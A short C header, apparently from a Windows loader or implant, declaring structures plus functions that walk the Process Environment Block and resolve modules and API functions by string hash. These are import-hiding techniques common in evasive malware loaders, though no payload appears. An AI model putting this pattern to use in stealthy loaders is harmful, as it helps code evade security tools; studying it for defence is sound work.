#pragma once
#include <windows.h>
#include "../api/apis.h"
#include "nt.h"
#include "utils.h"


typedef struct _Config {
	CHAR ID[27];
} Config;

typedef struct _LdrInstance {
	Win32 *win32;
	Modules *modules;
	Config *config;

} LdrInstance;

extern LdrInstance *ldr;


static inline PPEB GetPeb() {
#if defined(_WIN64) || defined(__x86_64__)
    return (PPEB)__readgsqword(0x60);
#elif defined(_M_IX86)|| defined(__i386__)
    return (PPEB)__readfsdword(0x30);
#endif
}


HMODULE GetModule(DWORD Hash);
FARPROC GetProc(HANDLE dll, DWORD Hash);
DWORD HashStringA(const char *str);
DWORD HashStringW(const wchar_t *str);

void LdrMain();
BOOL LdrAllocateCoreStructsAndLoadApis();
BOOL ParseConfig();